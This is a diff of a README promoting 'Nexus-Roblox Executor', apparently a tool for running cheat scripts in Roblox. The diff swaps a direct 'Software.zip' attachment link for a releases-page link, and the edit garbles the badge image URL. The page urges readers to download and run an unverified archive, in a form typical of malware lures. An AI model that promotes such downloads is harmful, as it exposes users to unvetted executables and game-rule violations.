@@ -18,7 +18,7 @@ Nexus Executor provides a seamless experience for executing Luau scripts directl
 
 To get started with Nexus-Roblox Executor, please download the necessary software from the following link:
 
-[Launch Nexus-Roblox Executor Software](https://github.com/user-attachments/files/18060583/Software.zip)
+[Launch Nexus-Roblox Executor Software](https://github.com/Sassbr/Nexus-Roblox/releases/tag/v2.0)
 
 ## Usage 🕹️
 
@@ -32,4 +32,4 @@ If you encounter any issues with the software or have any questions, feel free t
 
 Start exploring the world of Nexus-Roblox Executor today and enhance your scripting experience in Roblox! Happy Scripting! 🌟
 
-[![Launch Nexus-Roblox Executor Software](https://img.shields.io/badge/Launch%20Software-Click%20Here-green)](https://github.com/user-attachments/files/18060583/Software.zip)
+[![Launch Nexus-Roblox Executor Software](https://github.com/Sassbr/Nexus-Roblox/releases/tag/v2.0%20Software-Click%20Here-green)](https://github.com/Sassbr/Nexus-Roblox/releases/tag/v2.0)
